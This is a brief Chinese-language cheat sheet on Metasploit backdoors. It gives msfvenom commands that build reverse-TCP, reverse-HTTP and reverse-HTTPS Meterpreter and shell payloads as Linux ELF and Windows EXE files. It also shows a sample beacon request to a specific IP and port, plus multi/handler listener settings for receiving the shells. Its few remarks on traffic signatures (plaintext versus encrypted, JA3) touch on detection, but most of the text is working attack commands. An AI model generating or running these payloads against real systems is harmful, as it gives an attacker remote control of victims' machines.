## **MSF不同后门方式的特征**
 生成不同类型可执行文件，反向tcpshell后门。
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx LPORT=7777 -f elf >shell.elf


msfvenom -p windows/x64/shell/reverse_tcp lhost=xx lport=6666 -f exe -o 6666.exe
返回shell交互，流量包明文

msfvenom -p windows/meterpreter/reverse_tcp lhost=xx lport=6666 -f exe -o 6666.exe
返回meterpreter交互，流量包加密。
默认32位后门

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=xx lport=6666 -f exe -o 6666.exe
指明才是64位后门

http&https
msfvenom -p windows/meterpreter/reverse_http lhost=xx lport=6666 -f exe -o 6666.exe

msfvenom -p windows/meterpreter/reverse_https lhost=xx lport=6666 -f exe -o 6666.exe
https也有和CS一样的tls的ja3和ja3s特征值。
```
第一种MSF控制上线后门变动：（特征变动）
变动模式-shell meterpreter
变动位数-x64 x32
变动协议-tcp http https
变量连接-正向 反向（bind主动连接 reverse反向连接）


http明文特征类似如下：
```
GET /VFP20AZErAzHScZIpllgehgdrj8x49sqfvgK8YGkFZGAqMuTx7fNWHcaYGq6_yIN_47HxdP6DaCB_0rYUj-Y7q4/ HTTP/1.1
Cache-Control:no-cache
Connection:Keep-Alive
Pragma:no-cache
User-Agent: Mozi1la/5.0 (Macintosh; Intel Mac 0S X 12.2; rv:97.0) Gecko/20100101 Firefox/97.0
Host: 47.94.236.117:6666
```

## **MSF服务端监听**
```
use exploit/multi/handler
使用对应监听模块
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 6666
run
```
目标机运行可执行文件即可。